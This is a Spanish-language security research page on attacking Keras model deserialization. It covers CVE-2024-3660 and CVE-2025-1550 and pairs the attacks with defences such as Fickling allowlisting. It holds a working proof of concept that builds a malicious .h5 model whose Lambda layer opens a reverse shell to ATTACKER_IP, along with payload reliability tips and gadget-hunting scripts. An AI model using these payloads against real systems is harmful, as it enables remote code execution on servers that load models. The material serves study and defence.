# RCE y Gadget Hunting en la deserialización de modelos de Keras

Esta página resume técnicas prácticas de explotación contra el pipeline de deserialización de modelos de Keras, explica los componentes internos y la superficie de ataque del formato nativo .keras, y proporciona un toolkit para investigadores que buscan Model File Vulnerabilities (MFVs) y gadgets post-fix.

## Componentes internos del formato de modelos .keras

Un archivo .keras es un archivo ZIP que contiene como mínimo:<sup>[[1]](#references)</sup>
- metadata.json – información genérica (p. ej., la versión de Keras)
- config.json – arquitectura del modelo (superficie de ataque principal)
- model.weights.h5 – pesos en HDF5

El archivo config.json controla la deserialización recursiva: Keras importa módulos, resuelve clases/funciones y reconstruye capas/objetos a partir de diccionarios controlados por el atacante.<sup>[[1]](#references)</sup>

Fragmento de ejemplo para un objeto de capa Dense:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
La deserialización realiza:<sup>[[1]](#references)</sup>
- Importación de módulos y resolución de símbolos a partir de las claves module/class_name
- Invocación de from_config(...) o del constructor con kwargs controlados por el atacante
- Recursión en objetos anidados (activations, initializers, constraints, etc.)

Históricamente, esto exponía tres primitivas a un atacante que creara config.json:<sup>[[1]](#references)</sup>
- Control de los módulos que se importan
- Control de las clases/funciones que se resuelven
- Control de los kwargs que se pasan a los constructores/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Causa raíz:
- La deserialización heredada de Lambda reconstruía una función Python a partir de código marshaled controlado por el atacante: `func_load()` aplica base64-decode al payload, llama a `marshal.loads()` y crea un `FunctionType`. El bytecode de la función resultante se ejecuta cuando se invoca Lambda, y los loaders afectados anteriores a la versión 2.13 no imponían comprobaciones de safe mode para los formatos heredados.<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

En un archivo nativo de Keras v3, la función Lambda se representa como un objeto `__lambda__` cuyo campo `code` contiene código marshaled codificado en base64:<sup>[[17]](#references)[[18]](#references)</sup>
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"class_name": "__lambda__",
"config": {
"code": "<base64(marshal.dumps(function.__code__))>",
"defaults": null,
"closure": null
}
}
}
}
```
Mitigación:
- Keras aplica `safe_mode=True` de forma predeterminada para el formato nativo de Keras v3. Las lambdas de Python serializadas en `Lambda` se bloquean, a menos que el usuario opte explícitamente por desactivar esta protección con `safe_mode=False`; esta protección no cubre los formatos legacy de la misma manera.<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

Notas:
- Los formatos legacy (guardados antiguos en HDF5) o los codebases antiguos pueden no aplicar las comprobaciones modernas, por lo que los ataques de tipo “downgrade” aún pueden aplicarse cuando las víctimas usan loaders antiguos.

## CVE-2025-1550 – Importación arbitraria de módulos en Keras 3.0.0–3.8.x

Causa raíz:
- `_retrieve_class_or_fn` usaba `importlib.import_module(module)` con strings de módulos controlados por el atacante desde `config.json`.
- Impacto: Un archivo `.keras` creado específicamente podía hacer que `Model.load_model()` importara módulos y funciones de Python elegidos por el atacante, con efectos secundarios durante la importación y argumentos controlados por el atacante, incluso con `safe_mode=True`.<sup>[[1]](#references)[[4]](#references)</sup>

Idea del exploit:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Mejoras de seguridad (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Allowlist de módulos: las importaciones están restringidas a módulos del ecosistema oficial: keras, keras_hub, keras_cv, keras_nlp
- Modo seguro predeterminado: safe_mode=True bloquea la carga de funciones serializadas inseguras de Lambda
- Comprobación de tipos básica: los objetos deserializados deben coincidir con los tipos esperados

## Explotación práctica: RCE mediante Lambda en TensorFlow-Keras HDF5 (.h5)

Las implementaciones heredadas de TensorFlow-Keras todavía pueden aceptar archivos de modelo HDF5 (`.h5`). Si un atacante puede cargar un modelo que el servidor posteriormente cargue o utilice para ejecutar inferencias, un loader vulnerable puede deserializar una capa Lambda que contenga Python controlado por el atacante, que entonces puede ejecutarse dentro del flujo de trabajo del modelo de la aplicación.<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

PoC mínimo para crear un .h5 malicioso cuya Lambda ejecute un reverse shell cuando el objetivo invoque el modelo:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Notas y consejos de fiabilidad:
- Los puntos de activación varían según el formato y el flujo de trabajo; el write-up referenciado observó que el payload se ejecutaba dos veces durante la predicción. Trata los efectos secundarios como repetibles y haz que los payloads sean idempotentes.<sup>[[7]](#references)</sup>
- Fijación de versiones: haz coincidir las versiones de TF/Keras/Python de la víctima para evitar incompatibilidades de serialización. Por ejemplo, crea artefactos con Python 3.8 y TensorFlow 2.13.1 si eso es lo que utiliza el objetivo.<sup>[[7]](#references)</sup>
- Replicación rápida del entorno:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Validation: un payload benigno como os.system("ping -c 1 YOUR_IP") ayuda a confirmar la ejecución (por ejemplo, observando ICMP con tcpdump) antes de cambiar a un reverse shell.<sup>[[7]](#references)</sup>

## Superficie de gadgets posterior a la corrección dentro de la allowlist

Incluso con la allowlist de módulos de Keras y el safe mode, los callables permitidos pueden exponer efectos secundarios. Por ejemplo, `keras.utils.get_file` descarga una URL y la escribe en la ubicación de caché configurada, lo que lo convierte en un candidato para el análisis de gadgets.<sup>[[1]](#references)[[19]](#references)</sup>

Configuración candidata de Lambda (valida la firma de llamada en una prueba controlada):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {
"module": "keras.utils",
"class_name": "get_file",
"config": null,
"registered_name": null
},
"arguments": {
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Limitación importante:
- `Lambda.call()` siempre pasa la entrada del modelo como el primer argumento posicional y los `arguments` configurados como argumentos de palabra clave. Para `get_file`, ese valor posicional rellena `fname`; una incompatibilidad entre tensor y path puede hacer que este candidato falle antes de cualquier descarga, por lo que no es un gadget que funcione de forma garantizada.<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## Allowlisting de imports de pickle para modelos de AI/ML (Fickling)

Muchos formatos de modelos de AI/ML (archivos `.pt`/`.pth`/`.ckpt` de PyTorch, artefactos de joblib/scikit-learn y otros formatos nativos de Python) incorporan datos de Python pickle. La ruta heredada de Keras Lambda anterior utiliza bytecode de funciones marshalizado en su lugar, por lo que constituye un riesgo de deserialización independiente. Los opcodes de pickle pueden invocar comportamiento controlado por el atacante durante la deserialización, incluido el tampering del modelo o RCE, y los scanners simples pueden no detectar imports peligrosos nuevos o no incluidos en la lista.<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

Una defensa práctica fail-closed consiste en interceptar el deserializador de pickle de Python y permitir únicamente un conjunto revisado de imports inofensivos relacionados con ML durante el unpickling. Fickling, de Trail of Bits, implementa esta política e incluye una allowlist de imports de ML seleccionados a partir de miles de pickles públicos de Hugging Face.<sup>[[8]](#references)[[13]](#references)</sup>

Modelo de seguridad para imports “seguros” (intuiciones extraídas de la investigación y la práctica): los símbolos importados utilizados por un pickle deben cumplir simultáneamente lo siguiente:<sup>[[8]](#references)</sup>
- No ejecutar código ni provocar su ejecución (sin objetos de código compilado o fuente, ejecución de comandos del shell, hooks, etc.)
- No obtener ni establecer atributos o elementos arbitrarios
- No importar ni obtener referencias a otros objetos de Python desde la VM de pickle
- No activar ningún deserializador secundario (p. ej., marshal o pickle anidado), ni siquiera indirectamente

Habilita las protecciones de Fickling lo antes posible durante el inicio del proceso para que se compruebe cualquier carga de pickle realizada por frameworks (`torch.load`, `joblib.load`, etc.):<sup>[[9]](#references)</sup>
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Consejos operativos:
- Puedes deshabilitar/rehabilitar temporalmente los hooks cuando sea necesario:<sup>[[9]](#references)</sup>
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Si un modelo conocido como seguro es bloqueado, amplía la allowlist de tu entorno después de revisar los símbolos:<sup>[[9]](#references)</sup>
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling también expone guards genéricos de runtime si prefieres un control más granular:<sup>[[9]](#references)</sup>
- fickling.always_check_safety() para imponer comprobaciones en todos los pickle.load()
- with fickling.check_safety(): para imponerlas de forma limitada al ámbito
- fickling.load(path) / fickling.is_likely_safe(path) para comprobaciones puntuales

- Prefiere formatos de modelo que no sean pickle cuando sea posible (por ejemplo, SafeTensors).<sup>[[15]](#references)</sup> Si debes aceptar pickle, ejecuta los loaders con los mínimos privilegios, sin network egress, e impón la allowlist.

Esta estrategia basada primero en la allowlist bloquea de forma demostrable las rutas de explotación comunes de ML pickle, al tiempo que mantiene una alta compatibilidad. En el benchmark de ToB, Fickling detectó el 100 % de los archivos maliciosos sintéticos y permitió aproximadamente el 99 % de los archivos limpios de los principales repositorios de Hugging Face.<sup>[[8]](#references)[[10]](#references)</sup>


## Kit de herramientas para investigadores

1) Descubrimiento sistemático de gadgets en módulos permitidos

Enumera los callables candidatos en keras, keras_nlp, keras_cv, keras_hub y prioriza aquellos con efectos secundarios de archivo, network, process o env.<sup>[[1]](#references)</sup>

<details>
<summary>Enumera los callables potencialmente peligrosos en los módulos de Keras incluidos en la allowlist</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Pruebas de deserialización directa (no se necesita un archivo .keras)

Alimenta diccionarios manipulados directamente a los deserializadores de Keras para conocer los parámetros aceptados y observar los efectos secundarios.<sup>[[1]](#references)</sup>
```python
import keras

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {
"module": "keras.utils",
"class_name": "get_file",
"config": null,
"registered_name": null
},
"arguments": {
"origin": "https://example.com/x",
"cache_dir": "/tmp/keras-cache"
}
}
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```
3) Sondeo entre versiones y formatos

Keras existe en múltiples codebases/eras con diferentes controles:<sup>[[1]](#references)</sup>
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, prevista para eliminación)
- tf-keras: mantenido por separado
- Multi-backend Keras 3 (official): introdujo el formato nativo .keras

Repite las pruebas entre codebases y formatos (.keras frente a legacy HDF5) para descubrir regresiones o controles ausentes.

## References

- [1] [Búsqueda de vulnerabilidades en la deserialización de modelos de Keras (blog de huntr)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – Se añadieron comprobaciones a la serialización](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – RCE mediante deserialización de Lambda de Keras](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – importación arbitraria de módulos de Keras (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [informe de huntr – importación arbitraria n.º 1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [informe de huntr – importación arbitraria n.º 2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – RCE de Lambda de TensorFlow .h5 a root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [blog de Trail of Bits – El nuevo scanner de archivos pickle de AI/ML de Fickling](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – Protección de entornos de AI/ML (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Corpus de referencia para el escaneo de pickle de Fickling](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Contexto de los ataques Sleepy Pickle](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [Proyecto SafeTensors](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 – Las capas Lambda de Keras 2 permiten la inyección de código arbitrario](https://kb.cert.org/vuls/id/253266)
- [17] [Código fuente de la capa Lambda de Keras (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Código fuente de las utilidades de Python de Keras (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [API `get_file` de Keras](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../../banners/hacktricks-training.md}}
